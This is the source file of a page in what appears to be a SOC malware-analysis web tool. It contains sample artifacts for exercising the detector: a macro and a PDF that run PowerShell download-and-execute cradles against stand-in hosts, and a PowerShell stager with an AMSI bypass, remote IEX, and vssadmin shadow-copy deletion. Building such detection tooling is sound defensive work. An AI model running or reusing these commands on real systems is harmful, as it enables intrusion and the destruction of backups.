import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useEffect, useState, useMemo } from "react";
import { PageShell } from "@/components/PageShell";
import { AnalyzerShell, type AnalyzerState } from "@/components/soc/AnalyzerShell";
import { Panel, Chip } from "@/components/soc";
import { Empty } from "@/components/output";
import { IOCTable, MitrePanel } from "@/components/investigation";
import { useWorkspaceState } from "@/lib/use-workspace-state";
import { ResumeBanner } from "@/components/ResumeBanner";
import { copyText } from "@/lib/copy";
import { sendArtifact, takePendingArtifact } from "@/lib/handoff";
import { toast } from "sonner";
import { createCaseFromAnalysis } from "@/data/case-factory";
import { analyzeFileArtifact, type FileAnalysisResult } from "@/lib/fileArtifact";
import { buildLocalHistory } from "@/lib/correlation/history";
import { rememberCorrelation } from "@/lib/correlation";
import { EntitySection } from "@/components/entity";
import { ResultBanner, AnalysisLoading } from "@/components/output";
import { FileText, AlertTriangle, ArrowRight, Database,
  Hash, Bug, FileWarning, Sparkles, Activity, Workflow, Crosshair, Binary, Wrench, ShieldAlert } from "lucide-react";
import { PeSectionMap } from "@/components/malware/PeSectionMap";
import { YaraRuleModal } from "@/components/malware/YaraRuleModal";
import { DocumentInspectorView } from "@/components/malware/DocumentInspectorView";
import { HexViewerModal } from "@/components/malware/HexViewerModal";
import { MalwareCapabilityMatrix, extractCapaCapabilities } from "@/components/malware/MalwareCapabilityMatrix";
import { useLocker } from "@/lib/locker";

import { ErrorBoundary } from "@/components/ErrorBoundary";

export const Route = createFileRoute("/file")({ component: FilePage });

const SAMPLES: Record<string, { name: string; body: string }> = {
  ransomware_dropper: {
    name: "invoice_2024_05_15.pdf.exe",
    body: "MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00" + "\x00".repeat(36) + "\x40\x00\x00\x00"
      + "PE\x00\x00\x4c\x01\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x02\x01"
      + "\x0b\x01\x00\x00\x00\x10\x00\x00\x00\x20\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x40\x00\x00\x10\x00\x00\x00\x02\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00"
      + ".text\x00\x00\x00\x00\x10\x00\x00\x00\x10\x00\x00\x00\x08\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x60"
      + "UPX1\x00\x00\x00\x00\x00\x50\x00\x00\x00\x20\x00\x00\x00\x02\x00\x00\x00\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\xe0"
      + "VirtualAlloc\x00CreateRemoteThread\x00WriteProcessMemory\x00vssadmin delete shadows /all /quiet\nhttps://evil-c2-beacon.ru/drop\n185.220.101.5\nransom@dark-onion.org",
  },
  weaponized_office: {
    name: "Q3_Executive_Bonus.docm",
    body: "PK\x03\x04\x14\x00\x06\x00\x08\x00[Content_Types].xml\nword/_rels/settings.xml.rels Target='http://c2-staging.org/template.dotm' TargetMode='External'\nvbaProject.bin Sub AutoOpen()\nDim cmd As String\ncmd = 'powershell -enc SUVYIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAtAGgAbwBzAHQALgByAHUALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA=='\nCall Shell(cmd, 0)\nEnd Sub\nWScript.Shell CreateObject URLDownloadToFile",
  },
  phishing_pdf: {
    name: "urgent_overdue_notice.pdf",
    body: "%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >>\nendobj\n3 0 obj\n<< /Type /Action /S /JavaScript /JS (app.alert('Please authenticate to view encrypted notice'); app.launchURL('https://secure-login-portal.ru/verify', true);) >>\nendobj\n4 0 obj\n<< /Type /Action /S /Launch /F (powershell.exe -w hidden -c (New-Object Net.WebClient).DownloadString('http://evil.ru/p')) >>\nendobj\n/EmbeddedFiles << /Names [ (payload.exe) 5 0 R ] >>\n/URI (https://secure-login-portal.ru/verify)\n%%EOF",
  },
  powershell_stager: {
    name: "deploy_hotfix.ps1",
    body: `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n$endpoint = "http://185.220.101.44/stager.bin"\n$wc = New-Object Net.WebClient\n$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")\n$payload = $wc.DownloadString($endpoint)\nIEX $payload\nvssadmin delete shadows /all /quiet\nbcdedit /set {default} bootstatuspolicy ignoreallfailures\npowershell -enc SUVYIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAHIAdQAvAHMAdABhAGcAZQByAC4AcABzADEAJwApAA==`,
  },
  clean_script: {
    name: "backup.sh",
    body: `#!/bin/bash\n# Daily backup script\nBACKUP_DIR="/var/backups"\nTIMESTAMP=$(date +%Y%m%d_%H%M%S)\ntar -czf "$BACKUP_DIR/backup_$TIMESTAMP.tar.gz" /home/user/data\naws s3 cp "$BACKUP_DIR/backup_$TIMESTAMP.tar.gz" s3://company-backups/\necho "Backup complete: $TIMESTAMP"`,
  },
};

function genMarkdownExport(a: FileAnalysisResult): string {
  const lines = [
    `# File Analysis Report`,
    `**File:** \`${a.fileName}\``,
    `**Type:** .${a.extension} — ${a.mimeGuess}`,
    `**Size:** ${(a.fileSize / 1000).toFixed(1)} KB`,
    `**Generated:** ${new Date().toISOString()}`,
    "",
    "## Hashes",
    `- MD5: \`${a.hashes.md5}\``,
    `- SHA1: \`${a.hashes.sha1}\``,
    `- SHA256: \`${a.hashes.sha256}\``,
    "",
  ];
  if (a.doubleExtension) lines.push("- Algorithm: double-extension masquerade", "");
  if (a.suspiciousExtension) lines.push("- Alert: suspicious extension", "");
  if (a.fileTypeMismatch) lines.push("- Alert: file type / extension mismatch", "");
  if (a.highEntropy) lines.push("- Alert: high entropy content", "");
  lines.push("## Strings");
  lines.push(`- Total strings: ${a.strings.total}`);
  lines.push(`- Categories: ${Object.entries(a.strings.categories).map(([k, n]) => `${k}=${n}`).join(", ")}`);
  lines.push(`- Samples: ${a.strings.samples.slice(0, 12).map((s) => `\`${s.value}\``).join(", ")}`);
  lines.push("");
  if (a.pe.detected) {
    lines.push("## PE Header");
    lines.push(`- Signature: ${a.pe.signature}`);
    lines.push(`- Machine: ${a.pe.machine ?? "unknown"}`);
    lines.push(`- Subsystem: ${a.pe.subsystem ?? "unknown"}`);
    lines.push(`- Entry point: 0x${a.pe.entryPoint ?? "????"}`);
    lines.push(`- Note: ${a.pe.note}`);
    lines.push("");
  }
  if (a.imports.dlls.length || a.imports.apis.length) {
    lines.push("## Imports & API Calls");
    if (a.imports.dlls.length) lines.push(`- Dlls: ${a.imports.dlls.join(", ")}`);
    a.imports.apis.forEach((api) => lines.push(`- API: ${api.name}${api.suspicious ? " (suspicious)" : ""}`));
    lines.push("");
  }
  if (a.archive.kind) {
    lines.push("## Archive / Container", `- Kind: ${a.archive.kind}`);
    if (a.archive.entries.length) lines.push(`- Entries: ${a.archive.entries.join(", ")}`);
    lines.push(`- Note: ${a.archive.note}`, "");
  }
  if (a.office.detected) {
    lines.push("## Office Metadata");
    a.office.fields.forEach((f) => lines.push(`- ${f.label}: ${f.value}`));
    if (a.office.macros) lines.push("- Macros: **PRESENT**");
    lines.push("");
  }
  lines.push("## YARA-style Preview");
  const matched = a.yara.filter((r) => r.matched);
  if (matched.length) matched.forEach((r) => { lines.push(`- ${r.name} [${r.tags.join(", ")}] — ${r.description}`); r.evidence.slice(0, 3).forEach((e) => lines.push(`    ▸ ${e}`)); });
  else lines.push("- No built-in rules matched.");
  lines.push("- Illustrative offline preview — not YARA. Port matches to a real rule before operational use.");
  lines.push("");
  if (a.hashRelations.embedded.length) {
    lines.push("## Hash Relationships");
    a.hashRelations.embedded.slice(0, 12).forEach((h) => lines.push(`- Embedded ${h.alg}: \`${h.value}\``));
    if (a.hashRelations.embeddedOwnMatch) lines.push("- **Self-reference**: embedded hash matches own hash");
    lines.push("");
  }
  if (a.iocs.length) {
    lines.push("## IOCs", ...a.iocs.map((i) => `- ${i.type}: ${i.value} (${i.context})`), "");
  }
  if (a.displayFindings.length) {
    lines.push("## Findings", ...a.displayFindings.map((f) => `- [${f.severity.toUpperCase()}] ${f.title} — ${f.reason}`), "");
  }
  if (a.mitre.length) {
    lines.push("## MITRE ATT&CK", ...a.mitre.map((m) => `- ${m.technique}: ${m.name}`), "");
  }
  lines.push("## Limitations");
  lines.push("- PE header, imports, archive, and Office fields are text-projected from content; binary structures require byte-level upload (opt-in).");
  lines.push("- Hashes are computed over the analysed text content as shown.");
  return lines.join("\n");
}

function EmptyPreview() {
  const cards: Array<[string, string, typeof FileText]> = [
    ["File Metadata", "Name, size, extension, mime type, hashes (MD5/SHA1/SHA256)", FileText],
    ["Static Signals", "Double extension, suspicious extension, file type mismatch, high entropy", Activity],
    ["Embedded IOCs", "URLs, IP addresses, email addresses, API keys, secrets", Bug],
    ["Risk Score", "Weighted scoring with critical, high, and medium severity findings", AlertTriangle],
    ["MITRE Mapping", "Techniques mapped to ATT&CK where applicable", Crosshair],
    ["Case Integration", "Push findings, IOCs, and evidence directly to the Case workspace", ArrowRight],
  ];
  return (
    <div className="grid grid-cols-2 gap-3">
      {cards.map(([a, b, Icon]) => (
        <Panel key={a} title="" bodyClassName="text-mono ba-text-sm text-muted-foreground">
          <div className="flex items-center gap-1.5 text-mono ba-text-sm font-medium text-foreground">
            <Icon className="h-3.5 w-3.5 text-primary/70" />
            {a}
          </div>
          <p className="mt-1">{b}</p>
        </Panel>
      ))}
    </div>
  );
}

function FilePage() {
  const navigate = useNavigate({ from: "/file" });
  const [toolState, setToolState] = useState<AnalyzerState>("empty");
  const [activeTab, setActiveTab] = useState<"capabilities" | "signals" | "pe" | "document" | "strings" | "iocs" | "mitre">("capabilities");
  const [yaraModalOpen, setYaraModalOpen] = useState(false);
  const [hexModalOpen, setHexModalOpen] = useState(false);
  const locker = useLocker();
  const [fileName, setFileName] = useState("");
  const [fileDraft, setFileDraft] = useState("");
  const [activeSample, setActiveSample] = useState("");
  const resume = useWorkspaceState("file");

  const [analysis, setAnalysis] = useState<FileAnalysisResult | null>(null);
  const [errorMsg, setErrorMsg] = useState("");
  const [handoffNote, setHandoffNote] = useState<string | null>(null);
  const [binaryNotice, setBinaryNotice] = useState(false);

  useEffect(() => {
    const pending = takePendingArtifact();
    if (pending?.kind === "file" && pending.value) {
      setFileName(pending.value);
      setHandoffNote(`Filename carried from ${pending.source} — attachment content is not included; paste or upload the content to analyse.`);
    }
  }, []);

  useEffect(() => {
    if (toolState !== "analyzing") return;
    let cancelled = false;
    const t = setTimeout(() => {
      if (!fileName.trim()) {
        setErrorMsg("Enter a filename before analysing.");
        setToolState("error");
        return;
      }
      analyzeFileArtifact({ fileName, content: fileDraft, committed: true }, { history: buildLocalHistory() })
        .then(r => {
          if (cancelled || !r) return;
          setAnalysis(r); setToolState("loaded"); setErrorMsg("");
          resume.save({ artifact: fileDraft, analysis: r });
          if (r?.correlation?.length) rememberCorrelation(r.correlation, { source: "file" });
        })
        .catch(err => {
          if (cancelled) return;
          setErrorMsg(err instanceof Error ? err.message : "Analysis failed. Check the file content and try again.");
          setToolState("error");
        });
    }, 300);
    return () => { cancelled = true; clearTimeout(t); };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [fileName, fileDraft, toolState, resume.save]);

  useEffect(() => {
    if (activeSample && SAMPLES[activeSample]) {
      setFileName(SAMPLES[activeSample].name);
      setFileDraft(SAMPLES[activeSample].body);
      setBinaryNotice(false);
      setToolState("analyzing");
      setActiveSample(activeSample);
    }
  }, [activeSample]);

  function handleFileUpload(e: React.ChangeEvent<HTMLInputElement>) {
    const file = e.target.files?.[0];
    if (!file) return;
    setFileName(file.name);
    const reader = new FileReader();
    reader.onload = (ev) => {
      const text = ev.target?.result as string;
      if (text && text.includes("\u0000")) {
        // binary content does not survive utf-8 text projection — analyse the
        // extracted representation but say so next to every hash panel
        setBinaryNotice(true);
        setFileDraft(`[binary file: ${(file.size / 1024).toFixed(1)} KB — content displayed as text representation]`);
      } else {
        setBinaryNotice(false);
        setFileDraft(text || "");
      }
      setToolState("analyzing");
    };
    reader.readAsText(file, "utf-8");
    e.target.value = "";
  }

  function pasteFromClipboard() {
    navigator.clipboard.readText().then(t => {
      if (t) { setFileDraft(t); setBinaryNotice(false); setToolState("analyzing"); }
    }).catch(() => toast.error("Cannot read clipboard"));
  }

  const onRun = () => { setToolState("analyzing"); resume.save({ artifact: fileDraft }); };
  const onClear = () => {
    setFileDraft(""); setFileName(""); setAnalysis(null); setErrorMsg(""); setActiveSample(""); setToolState("empty"); setHandoffNote(null); setBinaryNotice(false); resume.clear();
  };
  const canRun = fileDraft.trim() !== "" && toolState !== "analyzing";

  const capaCapabilities = useMemo(() => (analysis ? extractCapaCapabilities(analysis) : []), [analysis]);
  const matchedCapas = useMemo(() => capaCapabilities.filter((c) => c.matched), [capaCapabilities]);

  const executiveVerdict = useMemo(() => {
    if (!analysis) return null;
    const hasCrit = analysis.displayFindings.some(f => f.severity === "critical");
    const hasHigh = analysis.displayFindings.some(f => f.severity === "high");
    const hasRansom = capaCapabilities.some(c => c.id === "cap-shadow" && c.matched);
    const hasInjection = capaCapabilities.some(c => c.id === "cap-injection" && c.matched);
    const hasAmsi = capaCapabilities.some(c => c.id === "cap-amsi" && c.matched);

    let classification = "BENIGN / UNKNOWN";
    let tone: "destructive" | "warning" | "success" = "success";
    let score = 12;

    if (hasRansom || (hasCrit && hasInjection)) {
      classification = "CRITICAL: ACTIVE MALWARE / RANSOMWARE STAGER";
      tone = "destructive";
      score = 96;
    } else if (hasAmsi || hasCrit || hasInjection || matchedCapas.length >= 3) {
      classification = "HIGH RISK: WEAPONIZED EXPLOIT PAYLOAD";
      tone = "destructive";
      score = 84;
    } else if (hasHigh || matchedCapas.length >= 1) {
      classification = "SUSPICIOUS: HEURISTIC ANOMALIES DETECTED";
      tone = "warning";
      score = 58;
    }

    const matchedNames = matchedCapas.map(c => c.name.split(" ")[0]);
    const narrative = matchedCapas.length > 0
      ? `Autonomous triage identified ${matchedCapas.length} high-fidelity capability signature(s) across ${new Set(matchedCapas.map(c => c.category)).size} tactical domain(s) [${matchedNames.slice(0, 4).join(", ")}]. Action: Isolate target endpoint, capture volatile memory dump, and execute 1-click Microsoft Defender KQL hunt.`
      : "Autonomous static heuristic inspection completed without detecting high-risk malicious capabilities. Baseline signature and entropy indicators remain within expected parameters.";

    return { classification, tone, score, narrative };
  }, [analysis, capaCapabilities, matchedCapas]);

  return (
    <ErrorBoundary name="FilePage">
      <PageShell
      title="Malware & File Forensic Station"
      eyebrow="intake / file & malware"
      description="Static analysis of executables, weaponized Office docs, malicious PDFs, scripts, and email attachments — hashes, section entropy, strings, and YARA generation."
      crumbs={[{ label: "Intake" }, { label: "Malware & File" }]}
    >
      <AnalyzerShell
        icon={FileText}
        title="Malware & File Forensics"
        purpose="Static analysis of executables, Office docs, PDFs, scripts, and email attachments — detect suspicious patterns, embedded IOCs, and hidden payloads."
        state={toolState}
        resumeBanner={resume.pending && (
          <ResumeBanner
            artifact={resume.pending.artifact}
            updatedAt={resume.pending.updatedAt}
            onResume={() => {
              const s = resume.accept();
              if (s) {
                setFileDraft(s.artifact);
                const a = s.analysis as FileAnalysisResult | null;
                if (a) { setFileName(a.fileName); setAnalysis(a); setToolState("loaded"); }
              }
            }}
            onStartFresh={resume.clear}
          />
        )}
        intake={
          <>
            <Panel title="File Input">
              <div className="space-y-3">
                <label htmlFor="ba-file-name" className="text-mono ba-text-2xs text-muted-foreground">Filename</label>
                {handoffNote && (
                  <p className="rounded border border-info/25 bg-info/5 px-2 py-1 text-mono ba-text-2xs text-muted-foreground">{handoffNote}</p>
                )}
                <input
                  id="ba-file-name"
                  value={fileName}
                  onChange={e => { setFileName(e.target.value); if (e.target.value.trim() && fileDraft.trim()) setToolState("analyzing"); }}
                  placeholder="e.g. invoice.pdf"
                  className="w-full rounded border border-divider-strong bg-surface-0 px-2.5 py-1.5 text-mono ba-text-sm text-foreground outline-none placeholder:text-fg-dim focus:border-primary/50"
                />
                <label htmlFor="ba-file-content" className="text-mono ba-text-2xs text-muted-foreground">File content</label>
                <textarea
                  id="ba-file-content"
                  value={fileDraft}
                  onChange={e => { setFileDraft(e.target.value); if (e.target.value.trim()) setToolState("analyzing"); }}
                  rows={10}
                  placeholder="Paste file content (text, base64, or code) or upload below..."
                  className="w-full resize-y rounded border border-divider-strong bg-surface-0 p-2 text-mono ba-text-sm text-foreground outline-none placeholder:text-fg-dim focus:border-primary/50 font-mono"
                />
                <div className="flex items-center gap-2">
                  <label className="flex cursor-pointer items-center gap-1.5 rounded border border-subtle bg-surface-1 px-2.5 py-1.5 text-mono ba-text-2xs text-muted-foreground hover:text-foreground">
                    <FileText className="h-3 w-3" /> Upload
                    <input type="file" className="hidden" onChange={handleFileUpload} />
                  </label>
                  <button onClick={pasteFromClipboard}
                    className="flex items-center gap-1.5 rounded border border-subtle bg-surface-1 px-2.5 py-1.5 text-mono ba-text-2xs text-muted-foreground hover:text-foreground">
                    Paste
                  </button>
                </div>
                {toolState !== "empty" && (
                  <div className="flex items-center gap-2 pt-1">
                    <span className="text-mono ba-text-2xs text-muted-foreground">{fileDraft.length} chars</span>
                    <button onClick={onClear}
                      className="text-mono ba-text-2xs text-muted-foreground hover:text-destructive">Clear</button>
                  </div>
                )}
              </div>
            </Panel>

            <Panel title="Samples" priority="secondary">
              <div className="space-y-1.5">
                {Object.entries(SAMPLES).map(([id, s]) => (
                  <button key={id} onClick={() => setActiveSample(id)}
                    className={"group flex w-full items-center gap-2 rounded border px-2 py-1.5 text-left transition-colors duration-150 " + (activeSample === id ? "border-primary/50 bg-primary/10" : "border-border/60 bg-surface-0 hover:border-primary/40")}>
                    <FileWarning className="h-3.5 w-3.5 shrink-0 text-muted-foreground group-hover:text-primary" />
                    <div className="min-w-0 flex-1">
                      <div className="truncate text-mono ba-text-sm text-foreground">{s.name}</div>
                      <div className="text-mono ba-text-2xs text-muted-foreground">{s.body.length} chars</div>
                    </div>
                  </button>
                ))}
              </div>
            </Panel>
          </>
        }
        resultBanner={analysis ? (
          <ResultBanner
            badge={analysis.summary.verdict === "malicious" ? "critical" as const : analysis.summary.verdict === "suspicious" ? "warning" as const : "success" as const}
            title={analysis.fileName}
            subtitle={analysis.mimeGuess}
            metrics={[
              { label: "Score", value: analysis.summary.score, tone: analysis.summary.score > 60 ? "destructive" : analysis.summary.score > 20 ? "warning" : "primary" },
              { label: "Findings", value: analysis.displayFindings.length, tone: "primary" },
              { label: "Critical/High", value: analysis.displayFindings.filter(f => f.severity === "critical" || f.severity === "high").length, tone: "destructive" },
              { label: "IOCs", value: analysis.iocs.length, tone: "destructive" },
            ]}
          />
        ) : undefined}
        exportMd={analysis ? () => {
          const blob = new Blob([genMarkdownExport(analysis)], { type: "text/markdown" });
          const a = document.createElement("a"); a.href = URL.createObjectURL(blob); a.download = `file-report-${Date.now()}.md`; a.click();
          URL.revokeObjectURL(a.href);
        } : undefined}
        exportJson={analysis ? () => {
          const blob = new Blob([JSON.stringify(analysis, null, 2)], { type: "application/json" });
          const url = URL.createObjectURL(blob);
          const a = document.createElement("a"); a.href = url; a.download = `file-analysis-${Date.now()}.json`; a.click();
          URL.revokeObjectURL(url);
        } : undefined}
        onCreateInvestigation={analysis ? () => {
          const { investigation } = createCaseFromAnalysis(analysis);
          toast.success(`Investigation created: ${investigation.case.title}`);
          navigate({ to: "/case" });
        } : undefined}
        sendToTargets={analysis ? [
          { label: "Intel Hub", to: `/intel?q=${encodeURIComponent(analysis.hashes.sha256)}`, icon: Bug },
          { label: "Detection", to: "/detection", icon: AlertTriangle, onClick: () => sendArtifact({ kind: "hash", value: analysis.hashes.sha256, source: "/file" }) },
          { label: "Logs & Alerts", to: "/logs", icon: Database, onClick: () => sendArtifact({ kind: "hash", value: analysis.hashes.sha256, source: "/file" }) },
          { label: "Case Notebook", to: "/case", icon: ArrowRight, onClick: () => sendArtifact({ kind: "hash", value: analysis.hashes.sha256, source: "/file" }) },
        ] : undefined}
        onRun={onRun}
        onClear={onClear}
        canRun={canRun}
      >
        {!analysis ? (
          <>
            {toolState === "empty" && (
              <Panel><EmptyPreview /></Panel>
            )}
            {toolState === "error" && (
              <Panel>
                <div className="flex items-center justify-center py-12">
                  <div className="text-center">
                    <AlertTriangle className="mx-auto h-8 w-8 text-destructive/80" />
                    <p className="mt-3 text-mono ba-text-sm font-medium text-destructive">Analysis failed</p>
                    <p className="mt-1 text-mono ba-text-xs text-muted-foreground">{errorMsg || "An unexpected error occurred."}</p>
                  </div>
                </div>
              </Panel>
            )}
            {toolState === "analyzing" && (
              <Panel><AnalysisLoading label="Analyzing file..." /></Panel>
            )}
          </>
        ) : (
          <>
            <Panel title="File Metadata">
              <table className="w-full text-left text-mono ba-text-sm">
                <tbody>
                  {[
                    { label: "Name", value: analysis.fileName },
                    { label: "Type", value: `.${analysis.extension} — ${analysis.mimeGuess}` },
                    { label: "Size", value: `${(analysis.fileSize / 1000).toFixed(1)} KB` },
                  ].map(r => (
                    <tr key={r.label} className="border-b border-subtle last:border-0">
                      <td className="py-1 pr-4 text-mono ba-text-xs text-muted-foreground">{r.label}</td>
                      <td className="py-1 text-mono ba-text-sm text-foreground">{r.value}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
              <div className="mt-3 space-y-1">
                {binaryNotice && (
                  <p className="mb-2 rounded border border-warning/40 bg-warning/10 px-2 py-1 text-mono ba-text-2xs text-warning">
                    Text-projection upload — these hashes cover the extracted text representation, not the original bytes. For byte-accurate hashing use Attachment Triage.
                  </p>
                )}
                {[
                  { label: "MD5", value: analysis.hashes.md5 },
                  { label: "SHA1", value: analysis.hashes.sha1 },
                  { label: "SHA256", value: analysis.hashes.sha256 },
                ].map(h => (
                  <div key={h.label} className="flex items-center gap-2">
                    <span className="shrink-0 text-mono ba-text-xs text-muted-foreground">{h.label}</span>
                    <code className="truncate text-mono ba-text-sm text-fg-dim font-mono">{h.value}</code>
                    <button onClick={() => copyText(h.value).then(() => toast.success(`${h.label} copied`)).catch(() => {})}
                      className="shrink-0 rounded border border-subtle bg-surface-1 px-1 py-0.5 text-mono ba-text-3xs text-muted-foreground hover:text-foreground">
                      copy
                    </button>
                  </div>
                ))}
              </div>
            </Panel>

            {/* Executive Malware Threat Assessment Dossier */}
            {executiveVerdict && (
              <div className="mb-3 rounded-lg border border-border bg-surface-1 p-3.5 shadow-sm min-w-0 max-w-full">
                <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border/60 pb-2">
                  <div className="flex items-center gap-2">
                    <ShieldAlert className={"h-4 w-4 shrink-0 " + (executiveVerdict.tone === "destructive" ? "text-destructive" : executiveVerdict.tone === "warning" ? "text-warning" : "text-success")} />
                    <span className="text-mono ba-text-xs font-bold uppercase tracking-wider text-foreground">
                      Executive Threat Assessment Dossier
                    </span>
                  </div>
                  <div className="flex flex-wrap items-center gap-2">
                    <Chip tone={executiveVerdict.tone}>
                      {executiveVerdict.classification}
                    </Chip>
                    <span className="text-mono ba-text-2xs text-muted-foreground font-semibold">
                      Composite Risk: <span className={executiveVerdict.tone === "destructive" ? "text-destructive font-bold" : executiveVerdict.tone === "warning" ? "text-warning font-bold" : "text-success"}>{executiveVerdict.score}/100</span>
                    </span>
                  </div>
                </div>

                <div className="mt-2.5 flex flex-col md:flex-row md:items-center justify-between gap-2 text-mono ba-text-xs text-foreground">
                  <p className="text-mono ba-text-2xs text-fg-dim max-w-3xl leading-relaxed">
                    {executiveVerdict.narrative}
                  </p>
                  <div className="flex flex-wrap items-center gap-1.5 shrink-0">
                    {matchedCapas.slice(0, 3).map((c) => (
                      <span key={c.id} className="rounded bg-surface-2 px-1.5 py-0.5 text-mono ba-text-3xs text-foreground border border-border/60">
                        {c.name.split(" ")[0]}
                      </span>
                    ))}
                    {matchedCapas.length > 3 && (
                      <span className="text-mono ba-text-3xs text-muted-foreground">+{matchedCapas.length - 3} more</span>
                    )}
                  </div>
                </div>
              </div>
            )}

            <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border pb-1.5 mb-3">
              <div className="flex flex-wrap items-center gap-1">
                {(["capabilities", "signals", "pe", "document", "strings", "iocs", "mitre"] as const).map(tab => (
                  <button key={tab} onClick={() => setActiveTab(tab)}
                    className={"rounded px-2.5 py-1 text-mono ba-text-2xs font-semibold transition-colors duration-150 " + (activeTab === tab ? "border border-primary/50 bg-primary/15 text-primary" : "border border-border bg-surface-1 text-muted-foreground hover:text-foreground")}>
                    {tab === "capabilities" ? `CAPA & Detonation (${matchedCapas.length})` :
                     tab === "signals" ? `Signals (${analysis.displayFindings.length})` :
                     tab === "pe" ? `PE & Sections (${analysis.peAnalysis?.sections.length || 0})` :
                     tab === "document" ? `Doc / Scripts (${(analysis.officeAnalysis?.has_macros ? 1 : 0) + (analysis.pdfAnalysis?.findings.length || 0) + (analysis.scriptAnalysis?.cradles.length || 0)})` :
                     tab === "strings" ? `Strings (${analysis.strings.total})` :
                     tab === "iocs" ? `IOCs (${analysis.iocs.length})` :
                     `MITRE (${analysis.mitre.length})`}
                  </button>
                ))}
              </div>

              <div className="flex items-center gap-1.5">
                <button
                  type="button"
                  onClick={() => setYaraModalOpen(true)}
                  className="inline-flex items-center gap-1.5 rounded border border-warning/50 bg-warning/10 px-2.5 py-1 text-mono ba-text-2xs text-warning hover:bg-warning/20 font-semibold transition-colors"
                >
                  <Sparkles className="h-3 w-3" /> YARA Rule
                </button>
                <button
                  type="button"
                  onClick={() => setHexModalOpen(true)}
                  className="inline-flex items-center gap-1.5 rounded border border-border bg-surface-1 px-2.5 py-1 text-mono ba-text-2xs text-foreground hover:bg-surface-2 transition-colors"
                >
                  <Binary className="h-3 w-3" /> Hex Inspector
                </button>
                <button
                  type="button"
                  onClick={() => {
                    sessionStorage.setItem("cyberchef_input", analysis.raw);
                    toast.success("Payload sent to CyberChef");
                    navigate({ to: "/chef" });
                  }}
                  className="inline-flex items-center gap-1.5 rounded border border-primary/40 bg-primary/10 px-2.5 py-1 text-mono ba-text-2xs text-primary hover:bg-primary/20 transition-colors"
                >
                  <Wrench className="h-3 w-3" /> To CyberChef
                </button>
              </div>
            </div>

            {activeTab === "capabilities" && (
              <MalwareCapabilityMatrix analysis={analysis} />
            )}

            {activeTab === "pe" && (
              <Panel title="PE Header & Section Entropy Map">
                <PeSectionMap pe={analysis.peAnalysis!} fileName={analysis.fileName} />
              </Panel>
            )}

            {activeTab === "document" && (
              <Panel title="Document, Macro & Script Forensics">
                <DocumentInspectorView
                  office={analysis.officeAnalysis}
                  pdf={analysis.pdfAnalysis}
                  script={analysis.scriptAnalysis}
                  rawContent={analysis.raw}
                  fileName={analysis.fileName}
                />
              </Panel>
            )}

            {activeTab === "strings" && (
              <Panel title={`Strings Preview · ${analysis.strings.total}`}>
                <div className="mb-3 flex flex-wrap gap-1.5">
                  {Object.entries(analysis.strings.categories).map(([k, n]) => (
                    <span key={k} className="rounded border border-subtle bg-surface-1 px-2 py-0.5 text-mono ba-text-2xs text-muted-foreground font-mono">
                      {k} · {n}
                    </span>
                  ))}
                </div>
                <div className="max-h-80 space-y-1 overflow-y-auto font-mono text-xs">
                  {analysis.strings.samples.map((s, i) => (
                    <div key={i} className="flex items-center gap-2 text-mono ba-text-2xs bg-surface-1/40 px-2 py-1 rounded border border-border/40 hover:bg-surface-1 transition-colors">
                      <Chip tone={s.kind === "url" || s.kind === "ipv4" || s.kind === "email" ? "warning" : s.kind === "api" ? "info" : "default"}>{s.kind}</Chip>
                      <span className="truncate text-foreground select-all">{s.value}</span>
                      <span className="ml-auto shrink-0 text-muted-foreground">{s.length}B</span>
                    </div>
                  ))}
                </div>
              </Panel>
            )}

            {activeTab === "signals" && (
              analysis.displayFindings.length === 0
                ? <Panel><Empty title="No signals" hint="File appears clean based on static analysis." /></Panel>
                : analysis.displayFindings.map((f, i) => (
                    <div key={i} className="mb-2 last:mb-0">
                      <Panel title="" bodyClassName="p-0">
                        <div className={"border-l-2 px-4 py-3 " + (
                          f.severity === "critical" ? "border-destructive/40" : f.severity === "high" ? "border-destructive/30" : f.severity === "medium" ? "border-warning/30" : "border-info/30"
                        )}>
                          <div className="flex items-start justify-between gap-2">
<div className="flex items-center gap-2">
                              <Chip tone={f.severity === "critical" || f.severity === "high" ? "destructive" : f.severity === "medium" ? "warning" : "info"}>{f.severity}</Chip>
                              <span className="text-mono ba-text-sm font-medium text-foreground">{f.title}</span>
                              {f.technique && <Chip tone="destructive">{f.technique}</Chip>}
                              {f.confidence && f.confidence.level !== "unknown" && <Chip tone="primary">confidence: {f.confidence.level}</Chip>}
                            </div>
                          </div>
                          <p className="mt-1.5 text-mono ba-text-sm text-fg-dim">{f.reason}</p>
                          <p className="mt-1 text-mono ba-text-2xs text-muted-foreground">Recommendation: {f.action}</p>
                        </div>
                      </Panel>
                    </div>
                  ))
            )}

            {activeTab === "iocs" && (
